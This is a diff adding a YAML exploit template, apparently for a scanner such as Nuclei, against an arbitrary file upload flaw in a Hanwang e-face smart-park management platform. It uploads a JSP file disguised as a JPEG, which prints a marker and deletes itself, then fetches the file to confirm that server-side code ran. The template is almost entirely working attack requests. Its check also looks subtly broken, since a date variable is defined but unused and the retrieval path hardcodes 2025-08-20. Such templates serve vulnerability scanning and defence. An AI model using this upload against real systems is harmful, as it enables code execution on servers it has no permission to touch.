@@ -1,0 +1,59 @@
+id: poc-yaml-hw-e-face-pass-spmp-monadfileupload-anyfile-upload
+info:
+  name: 汉王e脸通智慧园区管理平台 monadFileUpload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(7)}}"
+  t2: "{{base64(t1)}}"
+  dt: "{{date_time('2006-01-02')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "/manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - ".jsp"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        regex:
+          - "([0-9a-z]{9})\\.jsp"
+
+  - id: file-check
+    method: GET
+    path:
+      - "/manage/resource/2025-08-20/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
